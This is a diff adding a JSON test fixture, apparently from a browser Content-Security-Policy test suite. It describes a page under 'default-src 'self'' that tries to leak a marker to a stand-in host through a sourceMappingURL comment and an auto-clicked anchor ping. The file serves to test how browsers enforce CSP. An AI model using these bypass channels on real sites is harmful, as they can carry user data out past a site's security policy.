@@ -1,0 +1,17 @@
+```json
+{
+    "c661126": {
+        "url_queue.txt": "https://leak.test/CSP/c661126/main\nhttps://a.test/report/?leak=baseline\n",
+        "leak.test": {
+            "main": {
+                "index.html": "<html>\n  <body>\n    <script>\n      document.write(`\\x3Cscript>//# sourceMappingURL=https://a.test/report/?leak=c661126\\x3C/script>`);\n    </script>\n    <a href=\"#\" ping=\"https://a.test/report/?leak=c661126\" id=\"ping_link\"></a>\n    <script>\n      document.getElementById('ping_link').click();\n    </script>\n    <iframe style=\"display:none;\" src=\"https://a.test/CSP/c661126/helper\"></iframe>\n  </body>\n</html>\n",
+                "headers.json": "[\n    {\n        \"key\": \"Content-Security-Policy\",\n        \"value\": \"default-src 'self';\"\n    }\n]"
+            },
+            "helper": {
+                "index.html": "",
+                "headers.json": "[\n  {\n    \"key\": \"status\",\n    \"value\": \"204\"\n  },\n  {\n    \"key\": \"Content-Security-Policy\",\n    \"value\": \"default-src 'self';\"\n  }\n]\n"
+            }
+        }
+    }
+}
+```
